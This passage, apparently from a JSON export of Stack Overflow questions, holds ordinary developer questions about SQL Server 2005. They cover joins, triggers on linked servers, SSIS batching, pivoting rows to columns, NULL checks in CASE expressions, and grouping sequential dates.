[nvarchar](50) COLLATE Arabic_CI_AS NOT NULL,\n [Importance] [int] NOT NULL,\n [Description] [nvarchar](300) COLLATE Arabic_CI_AS NULL,\n [ImageUrl] [nvarchar](50) COLLATE Arabic_CI_AS NULL,\n CONSTRAINT [PK_Category] PRIMARY KEY CLUSTERED \n(\n [Id] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n</code></pre>\n\n<p>My Article Table :</p>\n\n<pre><code>CREATE TABLE [dbo].[Articles](\n    [Id] [int] IDENTITY(1,1) NOT NULL,\n    [AddedDate] [datetime] NOT NULL,\n    [AddedBy] [nvarchar](250) COLLATE Arabic_CI_AS NOT NULL,\n    [CategoryId] [int] NOT NULL,\n    [Title] [nvarchar](255) COLLATE Arabic_CI_AS NOT NULL,\n    [Abstract] [nvarchar](4000) COLLATE Arabic_CI_AS NULL,\n    [Body] [nvarchar](max) COLLATE Arabic_CI_AS NOT NULL,\n    [ReleaseDate] [datetime] NULL,\n    [ExpireDate] [datetime] NULL,\n    [Approved] [bit] NOT NULL,\n    [Listed] [bit] NOT NULL,\n    [CommentEnabled] [bit] NOT NULL,\n    [OnlyForMembers] [bit] NOT NULL,\n    [ViewCount] [int] NOT NULL,\n    [Votes] [int] NOT NULL,\n    [TotalRating] [int] NOT NULL,\n CONSTRAINT [PK_Articles] PRIMARY KEY CLUSTERED \n(\n    [Id] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\n</code></pre>\n\n<p>I don't know how to add The \"Title\" Column of \"Category\" Table into Query .</p>\n\n<p>if my Category table hadn't similar fields, surely this query workes :</p>\n\n<pre><code>DECLARE @sql nvarchar(4000)\nSET @sql = \n'SELECT\n    [Id],\n    [AddedDate],\n    [AddedBy],\n    [CategoryId],\n    [Title],\n    [Abstract],\n    [Body],\n    ArticleTitle\nFROM\n    (SELECT \n\n    [Id],\n    [AddedDate],\n    [AddedBy],\n    a.[CategoryId],\n    [Title],\n    [Abstract],\n    [Body],\n    b.Title as CategoryTitle ,\nROW_NUMBER() OVER(ORDER BY ' + @sortExpression + ') as RowNum\n\n    FROM  [dbo].[Articles] a INNER JOIN Category b on a.CategoryId = b.Id\n\n    WHERE a.CategoryId = ' + CONVERT(nvarchar(10), @CategoryId) + '\n    ) as CategoryIdInfo\n</code></pre>\n\n<p>If you want to Test you can download the <a href=\"http://sites.google.com/site/dindarbiz/file-cabinet/StoredProcedureAndTables.rar?attredirects=0&amp;d=1\" rel=\"nofollow\">Attachment(Tables and StoredProcedure)</a>\nThank you </p>\n"},{"tags":["sql-server","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":2554,"score":3,"question_id":4381765,"title":"INFORMATION_SCHEMA vs sysobjects","body":"<p>In SQL Server:</p>\n\n<p>What is the difference between INFORMATION_SCHEMA and sysobjects? Does one provide more information than the other or are they used for different things usually?</p>\n\n<p>Is sysobjects the same as sys.objects? If not, what is the difference between these?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12194879,"title":"What is the best approach to determine if a column exists in a SQL Server database table?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4381765/information-schema-vs-sysobjects\">INFORMATION_SCHEMA vs sysobjects</a>  </p>\n</blockquote>\n\n\n\n<p>I'm maintaining an old system (SQL Server 2005) and have come across 2 versions of a select statement that do the same thing. </p>\n\n<p><strong>Is one of the statements below more valid than the other?</strong></p>\n\n<pre><code>SELECT 1 \nFROM INFORMATION_SCHEMA.COLUMNS \nWHERE TABLE_NAME = 'tblMyTable' AND COLUMN_NAME = 'MyColumn'\n</code></pre>\n\n<p>or</p>\n\n<pre><code>SELECT 1  \nFROM sys.columns \nWHERE object_id = OBJECT_ID(N'[dbo].[tblMyTable]') AND name = N'MyColumn'\n</code></pre>\n"},{"tags":["php","sql-server-2005","iis6"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12192836,"title":"Friendly subfolder link to page (wikipedia style)","body":"<p>I am struggling to find this as I'm not sure exactly what I'm looking for!</p>\n\n<p>I've seen that some sites seem to use 'subfolders' as links to pages, e.g. wikipedia.</p>\n\n<p>E.g. Let's say I had a record in a database with a unique title \"My Shopping List\". I want to be able to navigate to <strong>www.mySite.com/my_shopping_list</strong> and have it automatically 'forward' to a page showing the relevant record.</p>\n\n<p>I am using IIS and wondering if there's a way I can do it with that, but I may be looking in the wrong place.</p>\n\n<p>This is for a knowledgebase where I might write an article called \"how to use a computer\" and would like to be able to create a 'friendly' link for users (<strong>http://www.mySite.com/how_to_use_a_computer</strong> rather than <strong>http://www.mySite.com/article.php?ID=123</strong>. I will need to be able to create these 'links' dynamically using the title field.</p>\n\n<p>Thank you</p>\n\n<p>EDIT: I am using IIS6</p>\n"},{"tags":["c#","sql","sql-server-2005"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":111,"score":2,"question_id":12193514,"title":"How to read the stored procedure query from Sql Server 2005 in C#?","body":"<p>I have a simple stored procedure</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[simple]\n\nAS\nBEGIN\n    -- SET NOCOUNT ON added to prevent extra result sets from\n    -- interfering with SELECT statements.\n    SET NOCOUNT ON;\n\n    DECLARE @sql NVARCHAR(MAX)\n\n    SELECT @sql = '\n            SELECT TOP(5) * FROM aTable'\n        PRINT @sql\n\n    EXEC sp_executesql \n        @sql\nEND\n</code></pre>\n\n<p>And now, in C#, I want to get, if is possible, the <code>@sql</code> value from stored procedure (after it was executed).</p>\n\n<p>I use Sql Server 2005.</p>\n\n<p>How to do that in <strong>C#</strong>?</p>\n"},{"tags":["sql-server","sql-server-2005","oracle","transactions","ddl"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":956,"score":6,"question_id":4711447,"title":"Oracle: DDL and transaction rollback","body":"<p>Could in Oracle DDL (create/alter) be transactional like they are in MS SQL (started from 2005)? </p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12193445,"title":"Get rows with IDs retrieved from other table, in the right order","body":"<p>I have two tables, <code>Posts</code> and <code>Cache</code>.</p>\n\n<p><code>Cache</code> tables saves that with Posts should I show. Posts IDs are saved in a column (<code>PostIDs</code> in <code>Cache</code> table, separated by a comma (<code>,</code>).</p>\n\n<p>And this is my code:</p>\n\n<pre><code>SELECT * FROM Posts a\nWHERE ID IN \n(\n  SELECT item FROM Cache AS b\n  CROSS APPLY dbo.fnSplit(b.postIDs, ',') \n  WHERE ((b.ownerID = 1) AND (b.magID = 8))\n)\n</code></pre>\n\n<p>Also <code>fnSplit</code> is working correctly.</p>\n\n<p>But the problem is, the order of posts is not correct.</p>\n\n<p>For example, if We have this string in <code>Cache</code> : <code>5,1,9,4,10,3</code>, I want to get posts from <code>Posts</code> with that order. (First row should be the post with ID 5, then 1, then 9, then 4, ...)</p>\n\n<p>But my code returns posts in another order: <code>1,3,4,5,9,10</code> (The order of rows in <code>Posts</code> table)</p>\n\n<p>What should I do (pure SQL) to get items in the order specified in <code>Cache</code> table? (In that example, I want to get posts in this order: <code>5,1,9,4,10,3</code>)</p>\n"},{"tags":["c#","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":12193345,"title":"Error after deleting default users in SQL Server 2005","body":"<p>I installed my software on client pc with SQL Server 2005, it was running correctly, until I deleted the administrator, user and nt built in accounts.</p>\n\n<p>Now the software connects but can't retain the connection state.</p>\n\n<p>I am getting this error. ^</p>\n\n<blockquote>\n  <p><em>ERROR : ExecuteReader requires an open and available connection.</em></p>\n</blockquote>\n\n<p>Before user deletion there was no error.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":72,"score":2,"question_id":12188811,"title":"Update statement in trigger takes longer to execute than executing it outside of trigger","body":"<p>I have a trigger for <code>After Update</code> </p>\n\n<p>This trigger works on a server which is going to update 2 tables on a linked server</p>\n\n<p>See code </p>\n\n<pre><code>ALTER TRIGGER [dbo].[tgAfterUpdate] ON  [dbo].[KS_3EToVision]\n   AFTER UPDATE\nAS \nBEGIN\n\n  BEGIN TRY\n  BEGIN TRANSACTION    -- Start the transaction\n\n  DECLARE @MatterNumber varchar(15);\n  SELECT @MatterNumber = i.MatterNumber FROM inserted i; \n\n    IF EXISTS(SELECT * FROM [FSSQLDEV01].[collnab].[dbo].[collection_header] WHERE         Ch_file_number COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT)\n       --UPDATE\n        IF (SELECT Ch_matter_status FROM [FSSQLDEV01].[collnab].[dbo].[collection_header] WHERE Ch_file_number COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT ) = 'Current'\n             BEGIN \n                --Parent table \n                UPDATE [FSSQLDEV01].[collnab].[dbo].[collection_header]\n                SET \n                    Ch_start_date = i.OpenDate \n                FROM \n                    Inserted i \n                WHERE ch_file_number COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT  \n\n                ----Child table \n                UPDATE [FSSQLDEV01].[collnab].[dbo].[collections] \n                SET \n                    Defendant_1 = i.Description \n                    , Loan_Number_1 = i.Comments \n                    , Client = i.KS_BookName \n                    , Date_Instructed = i.OpenDate \n                    , Person_Responsible_name = i.ResponsibleFeeEarnerName \n                    , Person_Responsible_Email = i.ResponsibleFeeEarnerEmail \n                    , Person_Acting_name = i.BillingFeeEarnerName \n                    , Person_Acting_email = i.BillingFeeEarnerEmail \n                    , Agent_Acting_name = i.BillingFeeEarnerName \n                    , Agent_Acting_email = i.BillingFeeEarnerEmail \n                    , CBA_Panel_Service_Area = i.KS_ServiceCat \n                    , HBN_Number = i.KS_ClientAcctRef \n                    , St_George_Contact = i.KS_Instructor \n                FROM \n                    Inserted i \n                WHERE Left(Collections.file_number,6) COLLATE DATABASE_DEFAULT = @MatterNumber COLLATE DATABASE_DEFAULT\n             END\n\n--If we reach here, success!\n   COMMIT\nEND TRY\nBEGIN CATCH\n  -- Whoops, there was an error\n  IF @@TRANCOUNT &gt; 0\n     ROLLBACK\n\n  -- Raise an error with the details of the exception\n  DECLARE @ErrMsg nvarchar(4000), @ErrSeverity int\n  SELECT @ErrMsg = ERROR_MESSAGE(),\n     @ErrSeverity = ERROR_SEVERITY()\n\n  RAISERROR(@ErrMsg, @ErrSeverity, 1)\nEND CATCH\n\nEND \n</code></pre>\n\n<p>if i try the update statement with the same criteria outside of the trigger it will only take 1 second but inside the trigger it can take upto 45 seconds.</p>\n\n<p>I have narrowed it down to the second update statement being the problem, because if i remove  the second update statement it will execute quickly.</p>\n\n<p>I have also attached an image the shows </p>\n\n<p>I also have a Trigger for Insert and this works quickly within a second And one for Deleting which will take an extended period with in the trigger but functions fine if i remove the 2 delete statements outside of the trigger.</p>\n\n<pre><code>USE [TE_3E_TRG]\nGO\n/****** Object:  Trigger [dbo].[tgAfterDelete]    Script Date: 08/30/2012 11:24:33 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\n\nALTER TRIGGER [dbo].[tgAfterDelete] ON  [dbo].[KS_3EToVision]\n   AFTER DELETE\nAS \n\nbegin\n\nBEGIN TRY\n   BEGIN TRANSACTION    -- Start the transaction\n            Begin\n                --Parent table \n                DELETE FROM [FSSQLDEV01].[collnab].[dbo].[collection_header] WHERE ch_file_number COLLATE DATABASE_DEFAULT = (SELECT d.MatterNumber FROM deleted  d) COLLATE DATABASE_DEFAULT\n\n                --Child table \n                DELETE FROM [FSSQLDEV01].[collnab].[dbo].[collections] WHERE Left(file_number,6) COLLATE DATABASE_DEFAULT = (SELECT d.MatterNumber FROM deleted  d) COLLATE DATABASE_DEFAULT            \n\n            END\n   -- If we reach here, success!\n   COMMIT\nEND TRY\nBEGIN CATCH\n  -- Whoops, there was an error\n  IF @@TRANCOUNT &gt; 0\n     ROLLBACK\n\n  -- Raise an error with the details of the exception\n  DECLARE @ErrMsg nvarchar(4000), @ErrSeverity int\n  SELECT @ErrMsg = ERROR_MESSAGE(),\n         @ErrSeverity = ERROR_SEVERITY()\n\n  RAISERROR(@ErrMsg, @ErrSeverity, 1)\nEND CATCH\n</code></pre>\n\n<p>Does anyone know why this drastic difference in execution time may occur between executing the statements within the trigger and out side of the trigger?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","reporting-services","crystal-reports"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":151,"score":2,"question_id":12184476,"title":"SQL Server 2005 need to create fake columns in a query","body":"<p>Hi All this is going to be a very strange question and all my searching has resulted in no good answers. The basic problem will help me solve two problems one in Crystal Reports and one in SSRS 2005. I have reports in both that need the same kind of solution. please bear with me as the explanation will be a bit lengthy.</p>\n\n<p>I need to use SSRS in an unusual fashion. The reports I need to create will only have minimal data and will be printed and filled in by hand in the field. They are being used as form printing program in this case.</p>\n\n<p>The reports will have a tablix/Matrix control on them and I need to create it with a specific # of columns regardless of if the data exists for those columns or not. In one case (SSRS), there are no fields that are being used as data fields that will be summed.</p>\n\n<p>I have data for the rows and columns, but what I need is to create the matrix/tablix with 10 columns. So if the recordset  has only 2 instances of the data that will make the columns, I still want to see all 10 columns but the headers being blank.</p>\n\n<p>So it would look something like this:</p>\n\n<pre><code>                         Col1|Col2|Col3|Fake1|Fake2|Fake3|......\nRow1\nRow2\nRow3\n.....\n</code></pre>\n\n<p>So if I have 1 column or 10 columns worth of data I still want to display 10 columns 2 with real headers and 8 with blank headers.</p>\n\n<p>Here is the SQL I'm using. this is the basis for a matrix in SSRS 2005. The Employee ID and Name are the rows. the JobAccount_Tracking_ID is the column.\nA record can have from 1 to 10 tracking_ids. </p>\n\n<p>What I want to return is a total of 10 tracking IDs regardless of the actual number of tracking IDs. The extras would show up in the matrix as blank columns.</p>\n\n<pre><code>Declare @FieldLogID as int\nSet @FieldLogID = 1018\n\nSELECT DISTINCT\nCustomizedFieldLogEmployee_1.Employee_EmployeeID, \nCustomizedFieldLogEmployee_1.Employee_FullName, \nCustomizedFieldLogEmployee_1.Injured_Today_Custom, \nCustomizedFieldLogJobAccount_1.JobAccount_TrackingID, \nCustomizedFieldLogEmployee_1.StartDateTime, \nCustomizedFieldLogEmployee_1.StopDateTime, \nCustomizedFieldLogEmployee_1.WorkHours\nFROM\nCustomizedFieldLogEmployee AS CustomizedFieldLogEmployee_1 LEFT OUTER JOIN CustomizedFieldLogJobAccount AS CustomizedFieldLogJobAccount_1 \nON CustomizedFieldLogEmployee_1.FieldLog_FieldLogID = CustomizedFieldLogJobAccount_1.FieldLog_FieldLogID\nWHERE CustomizedFieldLogEmployee_1.FieldLog_FieldLogID = @FieldLogID\n</code></pre>\n\n<p>Any ideas how I can do this? In the SSRS case I can't create a view in the database as it is a vendor's db. </p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":108,"score":0,"question_id":12187831,"title":"Executing commit on SSIS after processing N rows using Lookup","body":"<p>I'm following this tutorial to do a look up for the processed rows: <a href=\"http://consultingblogs.emc.com/jamiethomson/archive/2006/09/12/SSIS_3A00_-Checking-if-a-row-exists-and-if-it-does_2C00_-has-it-changed.aspx\" rel=\"nofollow\">SSIS: Checking if a row exists and if it does, has it changed?</a>. It's a good tutorial and it works like a charm, but there is this requirement to modify the DTS to support commit for a group of processed rows. I'll explain the whole scenario:</p>\n\n<ol>\n<li>Read the data from a csv file.</li>\n<li>For every row, check if the data exists in tableY (I'm doing this using the lookup).</li>\n<li>If exists, update the data in tableY (this works). If don't exists, insert the data in tableY (this also works).</li>\n<li><em>For every 1000 rows processed, the whole process must do a commit</em> (this is my headache).</li>\n</ol>\n\n<p>The dts will process like 200k rows every time it runs, so we want to make sure that the proccesed rows will be commited just in case this process raises any error (and a rollback of almost 199k rows is not good for the company).</p>\n\n<p>I know that the Ole DB Destination could handle this job, but what about the updated rows? I'm looking for a solution that could handle this job. I'm thinking to move the actual scenario for something like this:</p>\n\n<ol>\n<li>Create a dts that will retrieve the data from the file and move it to a tableX.</li>\n<li>Create a Job in SQL Server that will execute the dts as first step, then in second step will read the data in tableX and process every row to insert/update tableY. This step will be executed by a stored procedure that will handle the transaction by every 1000 rows.</li>\n</ol>\n\n<p>By the way, a non-functional requirement is that all this work must be done using SQL Server 2005 tools (no external applications involved, I must not develop a single C# app nor similars that could do all this job :( ).</p>\n\n<p>I'm open for any other recommendation to solve this problem.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12186356,"title":"Convert Column to Row","body":"<p>I know how to do this one way but the query i have created takes about 1:30 to run and i need to optimize this to be faster due to system limitations.  Ive used multiple joins of the same table to do this but was wondering if there is a shorter query or more efficient query i could use.</p>\n\n<p>Ive given a sample of the query but it does have about 100 columns pulled from a rows on the OrderItemFormDateFields table referenced below. Ive created columns and i get the results i need, but again, its slow. Let me know if you need any more detailed info about the tables. </p>\n\n<p>I guess im basically looking for a way to dynamically populate rather than list out each column.  Ive seen a few different ways with pivots and case statements but im not very good with pivots yet and case seemed like it would be even more inefficient.  Thanks!</p>\n\n<pre><code>SELECT\nOrderNumber\n,Product\n,OrderDate\n,   oifd1.value as  'ADD_SUBJ_ADDRESS'\n,   oifd2.value as  'ADD_SUBJ_BATHS'\n,   oifd3.value as  'ADD_SUBJ_BEDROOMS'\n,   oifd4.value as  'ADD_SUBJ_DATE'\n,   oifd5.value as  'ADD_SUBJ_GLA'\nFROM(\nSELECT CAST(oi.orderid as VARCHAR(MAX))+'.'+CAST(oi.orderitemid as VARCHAR(MAX))     as      OrderNumber\n,p.abbreviation as product, o.orderdate\nFROM OrderItems oi\njoin products p on p.productid = oi.productid\njoin orders o on o.orderid = oi.orderid)x\nleft    join    orderitemformdatafields     oifd1   on      oifd1.orderreference    =   OrderNumber and oifd1.fieldname in  (     'SUBJ_STREET_ADDR')\nleft    join    orderitemformdatafields     oifd2   on      oifd2.orderreference    =   OrderNumber and oifd2.fieldname in  (      'ADD_SUBJ_BATHS')\n left   join    orderitemformdatafields     oifd3   on      oifd3.orderreference    =   OrderNumber and oifd3.fieldname in  (      'ADD_SUBJ_BEDROOMS')\n left   join    orderitemformdatafields     oifd4   on     oifd4.orderreference =   OrderNumber and oifd4.fieldname in  (     'ADD_SUBJ_DATE')\nleft    join    orderitemformdatafields     oifd5   on      oifd5.orderreference    =   OrderNumber and oifd5.fieldname in  (     'ADD_SUBJ_GLA')\n</code></pre>\n"},{"tags":["sql","sql-server-2005","ssis"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12150974,"title":"Create Unique Column in SSIS","body":"<p>I have an SSIS package that takes a table and looks up a whole lot of other columns to end up with a dataset like:</p>\n\n<pre><code>ItemID | ProductGroupCode | Product Code\n1      |  AAAA            |\n2      |  AAAA            |\n3      |  BBBB            |\n4      |  BBBB            |\n5      |  CCCC            |\n</code></pre>\n\n<p>ItemID is unique. I need to create a unique ProductCode by joining the ProductGroupCode to a 4 digit number starting at 1700.</p>\n\n<p>So the data would look like:</p>\n\n<pre><code>ItemID | ProductGroupCode | Product Code\n1      |  AAAA            | AAAA1000\n2      |  AAAA            | AAAA1001\n3      |  BBBB            | BBBB1000\n4      |  BBBB            | BBBB1001\n5      |  CCCC            | CCCC1000\n</code></pre>\n\n<p>However it also needs to check that the Product Code doesn't already exist in the products table. There is a real chance that Product Code AAAA1000 already exists. If that is the case then it should increase the Product Code.</p>\n\n<p>I was able to do it with a cursor in SQL, the table \"ProductImportHalfWay\" is the dataset halfway through the SSIS package</p>\n\n<pre><code>DECLARE @ProductCode VARCHAR(10),\n        @CurrentProductCode VARCHAR(10),\n        @ItemID INT,\n        @ProductNumber INT\n\nSELECT @ProductNumber = 0, @CurrentProductCode = ''\n\nDECLARE productGroupCodes CURSOR FAST_FORWARD\nFOR SELECT distinct ProductGroupCode, ItemID\nFROM ProductImportHalfWay \nORDER BY ProductGroupCode \n\nOPEN productGroupCodes\n    FETCH NEXT FROM productGroupCodes INTO @ProductCode, @ItemID\n\n    WHILE @@FETCH_STATUS = 0\n    BEGIN\n        IF @CurrentProductCode &lt;&gt; @ProductCode\n        BEGIN\n            SET @CurrentProductCode = @ProductCode\n            SET @ProductNumber = 1699 --set to 1699 so that we can add 1 to get 1700\n        END\n\n        SET @ProductNumber = @ProductNumber + 1\n        WHILE EXISTS (SELECT 1 FROM Product WHERE ProductCode = @ProductCode + CAST(@ProductNumber AS VARCHAR(4)))\n        BEGIN\n            SET @ProductNumber = @ProductNumber + 1\n            --print 'increase'\n        END     \n\n        UPDATE ProductImportHalfWay\n        SET ProductGroupCode = @ProductCode + CAST(@ProductNumber AS VARCHAR(4))\n        WHERE ItemID = @ItemID\n\n        FETCH NEXT FROM productGroupCodes\n        INTO @ProductCode, @ItemID\n    END\nCLOSE productGroupCodes\nDEALLOCATE productGroupCodes\n</code></pre>\n\n<p>but I don't know how to put this in the middle of a data transformation (and I don't really want to output the \"ProductImportHalfWay\" table)</p>\n\n<hr>\n\n<p>EDIT: extra Example\nIf ProductCode AAAA1000 already exists in the database, then the imported records sould come thorugh as</p>\n\n<pre><code>ItemID | ProductGroupCode | Product Code\n1      |  AAAA            | AAAA1001\n2      |  AAAA            | AAAA1002\n3      |  BBBB            | BBBB1000\n4      |  BBBB            | BBBB1001\n5      |  CCCC            | CCCC1000\n</code></pre>\n"},{"tags":["sql","sql-server-2005","case","smalldatetime"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":7766,"score":4,"question_id":2453974,"title":"check for null date in CASE statement, where have I gone wrong?","body":"<p>My source table looks like this</p>\n\n<pre><code>Id     StartDate\n1      (null)\n2      12/12/2009\n3      10/10/2009\n</code></pre>\n\n<p>I want to create a select statement, that selects the above, but also has an additional column to display a varchar if the date is not null such as : </p>\n\n<pre><code>Id     StartDate    StartDateStatus\n1      (null)       Awaiting\n2      12/12/2009   Approved\n3      10/10/2009   Approved\n</code></pre>\n\n<p>I have the following in my select, but it doesn't seem to be working. All of the statuses are set to <code>Approved</code> even though the dates have some nulls</p>\n\n<pre><code>        select\n             id,\n             StartDate,\n        CASE StartDate\n        WHEN null THEN 'Awaiting'\n        ELSE 'Approved' END AS StartDateStatus\n        FROM myTable\n</code></pre>\n\n<p>The results of my query look like : </p>\n\n<pre><code>Id     StartDate    StartDateStatus\n1      (null)       Approved\n2      12/12/2009   Approved\n3      10/10/2009   Approved\n4      (null)       Approved\n5      (null)       Approved\n</code></pre>\n\n<p>StartDate is a <code>smalldatetime</code>, is there some exception to how this should be treated?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","full-text-search"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":164,"score":3,"question_id":8583182,"title":"Advice for sql server full text indexing change tracking and population","body":"<p>Here is my situation.  I have two tables that have millions of records.  I am wanting to full text a couple of columns on them (basically first and last names.)  However, both of these tables essentially get wiped and replaced by a legacy DTS package over the weekend.  I had change tracking set to automatic and when said DTS ran, the table got locked up and all queries failed and there was great weeping and gnashing of teeth. Many Bothans died.   </p>\n\n<p>So, I would like to do this the right way.  What settings or scheduling should I use for the FTS change tracking and population?  Should i set change tracking to off, and then schedule a full population after the DTS imports run?  Also, what is the difference between \"change tracking\" and \"population\" and how are they related?  How can the index work if there is no change tracking?  Does full population add the indexes even if change tracking is off?  </p>\n\n<p>thanks!\ncraig</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","aggregate-functions"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":127,"score":3,"question_id":3553336,"title":"select in sql server 2005","body":"<p>I have a table follow:</p>\n\n<pre><code>ID  |  first  |  end\n--------------------\na   |      1  |    3\nb   |      3  |    8\nc   |      8  |   10\n</code></pre>\n\n<p>I want to select follow:</p>\n\n<pre><code> ID  |  first  |  end\n---------------------\na-c  |      1  |   10   \n</code></pre>\n\n<p>But i can't do it. Please! help me. Thanks!</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":778,"score":1,"question_id":1529225,"title":"SQL Server query to group sequential date data","body":"<p>I have got a bit of 'brain fade' going on this afternoon, so if anyone can help with this mssql query it would be fantastic.</p>\n\n<p>I have a table called 'seasons' with three columns (there are more but not relevant to the example): seasonId, date, tariffId</p>\n\n<p>SeasonId is a unique key.\nA date can only have one tariffid, but a tariffId can have many different dates.</p>\n\n<p>For example:</p>\n\n<pre><code>seasonId  |  date      |  tariffId\n----------------------------------\n       1  | 1 jan 2009 |         1\n       2  | 2 jan 2009 |         1\n       3  | 3 jan 2009 |         2\n       4  | 4 jan 2009 |         3\n       5  | 5 jan 2009 |         3\n</code></pre>\n\n<p>I'd like to have a query return the sequence/range of dates against a particular tariffId</p>\n\n<p>Eg using the data above, it would return the following:</p>\n\n<pre><code>FromDate  |  ToDate    |  TariffId\n-----------------------------------\n       1  | Jan 2009 2 | Jan 2009 1\n       3  | Jan 2009 3 | Jan 2009 2\n       4  | Jan 2009 5 | Jan 2009 3\n</code></pre>\n\n<p>Is this possible?</p>\n\n<p><strong>EDIT</strong>\nThanks for all the answers so far! I am always amazed how far you get a response!</p>\n\n<p>However, my example data probably wasn't complex enough as a tariff can have 1 or more date ranges</p>\n\n<pre><code>seasonId  |  date      |  tariffId\n----------------------------------\n       1  | 1 jan 2009 |         1\n       2  | 2 jan 2009 |         1\n       3  | 3 jan 2009 |         2\n       4  | 4 jan 2009 |         3\n       5  | 5 jan 2009 |         3\n       6  | 6 jan 2009 |         1\n       7  | 7 jan 2009 |         1\n       8  | 8 jan 2009 |         3\n</code></pre>\n\n<p>Would give:</p>\n\n<pre><code>FromDate   |     ToDate  |  TariffId\n------------------------------------\n1 Jan 2009 | 2 Jan 2009  |         1\n3 Jan 2009 | 3 Jan 2009  |         2\n4 Jan 2009 | 5 Jan 2009  |         3\n6 Jan 2009 | 7 Jan 2009  |         1\n8 Jan 2009 | 8 Jan 2009  |         3\n</code></pre>\n\n<p>Ideas?</p>\n\n<p>Thanks everyone for their help on this! This site is AWESOME!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":220,"score":0,"question_id":4937902,"title":"How to display the time with condition","body":"<p>Using SQL Server</p>\n\n<p>Table1</p>\n\n<pre><code>ID  |  Intime  |   Outtime\n--------------------------\n001 | 00:21:00 |  00:48:00\n002 | 08:14:00 |  13:45:00\n003 | 00:34:00 |  00:18:00\n</code></pre>\n\n<p>Time format: HH:MM:SS</p>\n\n<p>Tried Code.</p>\n\n<pre><code>SELECT dateadd(mi, datediff(mi,0, Intime)/30*30, 0) AS 'Intime'\n  FROM Table1\n</code></pre>\n\n<p>Above Query giving the result for 30 minutes or 1 hours, which means minutes less than 30 then it is displaying 30 minutes, minutes greater than 30 then it is displaying 1 Hours </p>\n\n<p>I need to display the time like 15 minutes, 30 minutes or 1 Hours, it should display a roundoff time with condition</p>\n\n<p>Conditions are</p>\n\n<pre><code>If minutes is less than 15 minutes then it should display exactly 15 Minutes, for example 03:15:00\nIf minutes is greater than 15 minutes and less than 45 minutes then it should display exactly 30 Minutes, for example 03:30:00\nIf minutes is greater than 45 minutes then it should display exactly 1 hour, for example 04:00:00\n</code></pre>\n\n<p>Expected Output from the table1</p>\n\n<h2>    ID  |  Intime  |  Outtime</h2>\n\n<pre><code>001 | 00:30:00 | 01:00:00\n002 | 08:15:00 | 14:00:00\n003 | 00:30:00 | 00:30:00\n</code></pre>\n\n<p>How to make a query for the roundoff time with condition.</p>\n\n<p>Need Query Help</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":466,"score":0,"question_id":838988,"title":"How can i create this time-table with stable time format?","body":"<p>How can i get result \"My Dream Table Result\"</p>\n\n<pre><code>CREATE TABLE #temp(\n    [count] int\n  , [Time] nvarchar(50))\nDECLARE @DateNow DATETIME,@i int\n\nSET @DateNow='00:00'\nSET @i=1;\nWHILE(@i&lt;1440)\n    BEGIN\n        SET @DateNow=DATEADD(minute, 1, @DateNow)\n        INSERT INTO #temp ([count], [Time]) VALUES (0, @DateNow)\n        SET @i=@i+1\n    END\nSELECT [count],CONVERT(VARCHAR(max), [Time], 104) AS [Time] FROM  #temp\nDROP TABLE #temp\n</code></pre>\n\n<p>Table Result:</p>\n\n<pre><code>Count  |                 Time\n-----------------------------\n    0  |  Jan  1 1900 12:01AM\n    0  |  Jan  1 1900 12:02AM\n    0  |  Jan  1 1900 12:03AM\n    0  |  Jan  1 1900 12:04AM\n</code></pre>\n\n<p>But i don't like this table Time format is not ok. I need this table\nMy Dream Table 